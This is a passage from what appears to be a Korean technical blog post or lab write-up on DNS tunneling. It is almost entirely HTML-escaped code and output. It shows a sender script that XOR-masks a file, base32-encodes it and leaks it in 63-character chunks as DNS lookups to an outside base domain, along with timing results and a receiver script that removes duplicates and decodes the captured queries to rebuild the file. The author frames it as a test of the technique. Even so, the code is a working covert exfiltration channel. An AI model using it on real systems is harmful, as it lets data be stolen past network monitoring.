&lt;span class=&quot;n&quot;&gt;send_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;S-%d.O-%d.E-%d&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#Send seed, size of data
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;enc_part&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc_part&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;send_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;.&quot;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;send_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_part&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;send_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc_part&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t_start&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Elapsed Time : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Secs&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Speed(Org) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B/sec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Speed(Enc) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;B/sec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Org&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;21822&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Data&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;34920&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Elapsed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Time&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mf&quot;&gt;37.387837171554565&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Secs&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Speed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Org&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mf&quot;&gt;583.6657493684237&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sec&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Speed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;  &lt;span class=&quot;mf&quot;&gt;933.9935829871392&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sec&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;21.3KBì˜ íŒŒì¼ì„ í…ŒìŠ¤íŠ¸í•˜ì˜€ê³ , ì•½ 0.5KB/s ì†ë„ë¡œ ì „ì†¡ë˜ì—ˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê²°ê³¼ëŠ” ë„¤íŠ¸ì›Œí¬ í™˜ê²½ì— ë”°ë¼ ë‹¤ë¥¼ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;í…ŒìŠ¤íŠ¸-ì½”ë“œìˆ˜ì‹ &quot;&gt;í…ŒìŠ¤íŠ¸ ì½”ë“œ(ìˆ˜ì‹ )&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/21cacb46-3992-4c22-a4da-da78bb38ed70/8f4736de-b36e-44bf-abad-0cd87c3445d4.png&quot; alt=&quot;/assets/21cacb46-3992-4c22-a4da-da78bb38ed70/8f4736de-b36e-44bf-abad-0cd87c3445d4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DNSë¥¼ ìš”ì²­í•˜ëŠ” ê³¼ì •ì—ì„œ ì¤‘ë³µëœ ê°’ì´ ì „ì†¡ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ì´ë¥¼ ì²˜ë¦¬í•´ì£¼ê³  ì´ˆê¸°ì— ì „ì†¡í•œ Seedë¥¼ í†µí•´ ë³µí˜¸í™”í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rand_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getrandbits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./result.dat&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Seed : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data Size(Org) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data Size(Enc) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;rnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;b&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b32decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data Size(Enc-Recv) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Data Size(Dec-Recv) : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./test.dat&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rb&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Compare Result :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;org&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

